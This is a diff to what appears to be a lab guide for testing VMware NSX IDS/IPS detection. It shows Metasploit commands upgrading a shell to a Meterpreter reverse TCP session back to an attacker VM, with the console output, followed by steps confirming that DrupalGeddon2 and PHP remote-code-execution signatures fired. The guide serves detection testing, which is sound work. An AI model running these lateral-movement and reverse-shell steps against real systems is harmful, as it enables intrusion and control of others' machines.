@@ -201,15 +201,13 @@ msf5 post(multi/manage/shell_to_meterpreter) > set session 4
 session => 4
 msf5 post(multi/manage/shell_to_meterpreter) > exploit
 ```
-4. Confirm a **Meterpreter** reverse TCP session was established from **App2-APP-TIER VM** back to the **Extermal VM** and interact with the session. You may see 2 Meterpreter sessions get established. 
+4. Confirm a **Meterpreter** reverse TCP session was established from **App2-APP-TIER VM** back to the **Extermal VM** and interact with the session.
 ```console
 [*] Upgrading session ID: 4
 [*] Starting exploit/multi/handler
 [*] Started reverse TCP handler on 10.114.209.151:8082
 [*] Sending stage (980808 bytes) to 10.114.209.148
-[*] Meterpreter session 5 opened (10.114.209.151:8082 -> 10.114.209.148:15262) at 2020-07-29 09:45:08 -0500
-[*] Sending stage (980808 bytes) to 10.114.209.148
-[*] Meterpreter session 6 opened (10.114.209.151:8082 -> 10.114.209.148:12896) at 2020-07-29 09:45:12 -0500
+[*] Meterpreter session 5 opened (10.114.209.151:8082 -> 10.114.209.148:55750) at 2020-07-29 09:11:14 -0500
 [*] Command stager progress: 100.00% (773/773 bytes)
 [*] Post module execution completed
 ```
@@ -264,7 +262,7 @@ This completes the lateral movement attack scenario. Now we will go back to NSX 
 **Confirm IDS/IPS Events show up in the NSX Manager UI**
 1.	In the NSX Manager UI, navigate to Security -->  Security Overview
 2. Under the **Insights** tab, confirm you see a number of attempted intrusion against the  **APP-1-WEB-TIER** workload
-![](Images/IDPS_POC_13.PNG)
+![](assets/images/IDPS_POC_18.PNG)
 3. Click  **APP-1-WEB-TIER** to open a filtered event view for this workload. 
 4. Confirm 2 signatures have fired; one exploit-specific signature for **DrupalGeddon2** and one broad signature indicating the use of a **Remote Code execution via a PHP script**
 ![](Images/IDPS_POC_14.PNG)
